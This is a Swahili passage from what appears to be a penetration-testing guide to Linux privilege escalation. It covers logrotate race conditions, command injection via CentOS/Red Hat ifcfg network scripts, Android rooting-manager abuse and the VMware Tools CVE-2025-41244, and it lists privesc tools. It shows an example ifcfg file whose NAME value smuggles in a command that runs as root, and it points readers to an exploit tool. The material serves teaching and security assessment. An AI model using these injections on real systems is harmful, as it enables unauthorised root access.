Kazi ya `logrotate` yenye ruhusa za juu inaweza kuunda njia ya kuandika faili za watumiaji wengine inapozungusha logi iliyo chini ya saraka ambayo mtumiaji mwenye ruhusa za chini anaweza kubadilisha au kuelekeza kwingine wakati wa mzunguko. Logi inayoweza kuandikwa pekee ni kidokezo tu. Thibitisha kanuni halisi inayotumika na maagizo yake ya `create`, `olddir`, na `su`; utambulisho halisi wa kazi iliyopangwa; ruhusa za kuandika na kutafuta kwenye saraka mama ya logi; na kama toleo lililosakinishwa pamoja na sera vinaruhusu kubadilisha mahali pa kuhifadhi. Ganda la baadaye lenye ruhusa za juu lazima pia lipakie faili iliyotokana na mabadiliko ili uandishi wa faili ya uanzishaji uweze kutekeleza amri. Kagua ratiba, kanuni, toleo/ufungashaji, na metadata ya njia bila kuchochea mzunguko au kujaribu race condition.

> [!TIP]
> Usichukulie `3.18.0` au mfuatano wowote wa toleo pekee kuwa mpaka wa uwezekano wa kutumiwa. [Rekodi ya mabadiliko ya upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) inaonyesha uimarishaji wa usalama wa saraka na symlink katika matoleo mengi, na usambazaji unaweza kuwa umeweka marekebisho hayo kwenye matoleo ya awali. [Mwongozo wa upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) unapendekeza `su` wakati root inazungusha logi kwenye saraka zinazodhibitiwa na watumiaji wasio na ruhusa za juu; thibitisha kanuni inayotumika na tabia halisi.

Maelezo zaidi kuhusu udhaifu huu yanapatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Unaweza kutumia udhaifu huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu unafanana sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi za nginx),** kwa hiyo kila unapogundua kuwa unaweza kubadilisha logi, angalia nani anazisimamia na kama unaweza kupandisha ruhusa kwa kubadilisha logi na symlink.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Marejeo ya udhaifu:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Faili ya `ifcfg-*` ni kidokezo cha ukaguzi ikiwa mtumiaji mwenye ruhusa za chini anaweza kuiunda au kuibadilisha **na** njia ya kuwezesha mtandao yenye ruhusa za juu itasoma faili hiyo mahsusi. Thibitisha ruhusa halisi za faili na saraka, kiolesura kilichochaguliwa, utekelezaji uliosakinishwa wa `ifup`/`ifdown`, na nani anayevianzisha. Faili inayoweza kuandikwa pekee haisababishi utekelezaji. [Mwongozo wa mitandao wa RHEL 7 wa Red Hat](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) unatofautisha script za zamani za mtandao na NetworkManager: ya pili haiwashi yenyewe za kwanza. [Nyaraka za RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) zinaeleza kuwa `ifup`/`ifdown` za chaguo-msingi hutumia NetworkManager, huku kifurushi cha hiari cha urithi kikitoa shell script.

Kwenye mfumo unaotumia kweli script za zamani zenye ruhusa za juu, thamani ya `ifcfg-*` isiyowekwa ndani ya alama za kunukuu na inayochakatwa na shell, kama `NAME=`, inaweza kuvuka mpaka wa utekelezaji wa msimbo. Thibitisha parser, thamani na njia halisi ya uanzishaji; usihitimishe kuwa shell itaitafsiri kwa kutazama jina la faili au uwepo wa NetworkManager. Wrapper inayoruhusiwa na sudo na inayoandika ingizo la mtumiaji kwenye faili ya `ifcfg-*`, kisha kuita `ifup` ya zamani, ni njia tofauti ya kuvuka mpaka huu hata kama mtumiaji hawezi kuhariri faili moja kwa moja.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, na rc.d**

Saraka ya `/etc/init.d` ina **scripts** za System V init (SysVinit), **mfumo wa kawaida wa zamani wa kusimamia huduma za Linux**. Ina scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` za huduma. Zinaweza kutekelezwa moja kwa moja au kupitia viungo vya mfano vilivyo kwenye `/etc/rc?.d/`. Njia mbadala kwenye mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya zaidi wa **kusimamia huduma** ulioletwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya kuhamia Upstart, scripts za SysVinit bado hutumika pamoja na usanidi wa Upstart kutokana na safu ya uoanifu iliyomo ndani ya Upstart.

**systemd** ni mfumo wa kisasa wa uanzishaji na usimamizi wa huduma, unaotoa vipengele vya hali ya juu kama vile kuanzisha daemon inapohitajika, usimamizi wa automount, na picha za hali ya mfumo. Hupanga faili katika `/usr/lib/systemd/` kwa vifurushi vya usambazaji na `/etc/systemd/system/` kwa marekebisho ya msimamizi, na hivyo kurahisisha mchakato wa usimamizi wa mfumo.<sup>[[21]](#references)</sup>

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kutoka kwenye Shell zenye vizuizi


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: matumizi mabaya ya manager-channel

Android rooting frameworks kwa kawaida huunganisha syscall ili kufichua utendaji wa kernel wenye upendeleo kwa manager ya userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa saini unaotegemea mpangilio wa FD au mipango dhaifu ya nenosiri) unaweza kuruhusu app ya ndani kujifanya manager na kupata root kwenye vifaa ambavyo tayari vina root. Jifunze zaidi na upate maelezo ya exploitation hapa:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Ugunduzi wa huduma ya VMware Tools: LPE (CWE-426) kupitia exec inayotegemea regex (CVE-2025-41244)

Ugunduzi wa huduma unaotegemea regex katika VMware Tools/Aria Operations unaweza kutoa njia ya binary kutoka kwenye mistari ya amri ya michakato na kuitekeleza kwa -v katika muktadha wenye upendeleo. Miundo ya ruhusa pana (kwa mfano, inayotumia \S) inaweza kulingana na listeners zilizowekwa na mshambuliaji kwenye maeneo yanayoweza kuandikwa (kwa mfano, /tmp/httpd), na kusababisha utekelezaji kama root (CWE-426 Untrusted Search Path).<sup>[[27]](#references)</sup>

Jifunze zaidi na uone muundo wa jumla unaoweza kutumika kwa stacks nyingine za ugunduzi/ufuatiliaji hapa:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Usalama wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Zana bora ya kutafuta njia za Linux local privilege escalation:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(chaguo la -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha udhaifu wa kernel kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Mkusanyiko wa scripts zaidi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)



## References

- [1] [0xdf – HTB Planning (kupata privesc kupitia Crontab UI, kutumia tena credentials za zip -P)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: payload ya .text_sig iliyoghushiwa kwa monitor inayoendeshwa na cron](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: kukwepa Neighborhood Watch (kuteka PATH kupitia sudo env_keep)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Kupata haki za juu kwenye Linux: misingi](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Mwongozo wa Linux Privilege Escalation](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Kushambulia na kujilinda: mbinu za Linux Privilege Escalation za 2016](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Hakuna aliyetarajia utekelezaji wa amri!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Privilege Escalation)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Mwongozo wa mazoezi ya maabara - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Vidokezo na mbinu za Linux Privilege Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Zana ya Linux Enumeration & Privilege Escalation](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket ni nini?](https://www.linux.com/news/what-socket/)
- [15] [Maelezo ya Peppo (Proving Grounds)](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Tumia D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Linux Privilege Escalation kupitia SUID Executables](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo Sehemu ya 2 – Linux Privilege Escalation](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Jinsi ya kusimamia ACLs kwenye Linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Kupata root kupitia network-scripts kwenye Redhat/CentOS](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd ni nini?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection kupitia logs, mlolongo mzima)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [Mwongozo wa GNU Bash – BASH_ENV (faili ya uanzishaji isiyo ya mwingiliano)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (nakala ya pg_basebackup kupitia cron → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Unalitaja, VMware inalipa kwa ruhusa za juu (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Kupandisha Haki kwa Sudo Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Udhaifu wa Sudo wa CVE-2025-32462 na CVE-2025-32463 wa kupandisha haki](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Saraka za hazina za PYC](https://peps.python.org/pep-3147/)
- [32] [Nyaraka za Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [suala #74 la polkit/polkit](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet ya @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Kurekodi nywila kwenye Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Maelezo ya race condition ya Logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Nyaraka za Python 3.10 – `site` na faili za usanidi wa path](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
